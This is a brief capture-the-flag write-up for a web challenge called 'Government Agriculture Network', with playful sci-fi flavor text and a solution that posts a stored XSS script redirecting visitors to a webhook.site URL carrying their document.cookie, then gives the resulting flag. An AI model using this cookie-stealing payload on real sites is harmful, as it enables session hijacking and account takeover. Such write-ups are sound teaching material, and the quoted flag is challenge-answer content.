# CTF Name – Government Agriculture Network

* **Category:** easier/web
* **Points:** 2

## Challenge

Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here.

Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.

The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.

You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to rescue it.

## Solution

Used ```webhook.site``` which creates a unique url for you. Any requests sent to that url are logged there. Then, made a post on ```https://govagriculture.web.ctfcompetition.com/``` with the following script ```<script>document.location="urlfromwebhook.site?stolenCookie="+document.cookie</script>```

```
The cookie has the following flag ```CTF{8aaa2f34b392b415601804c2f5f0f24e}```
```
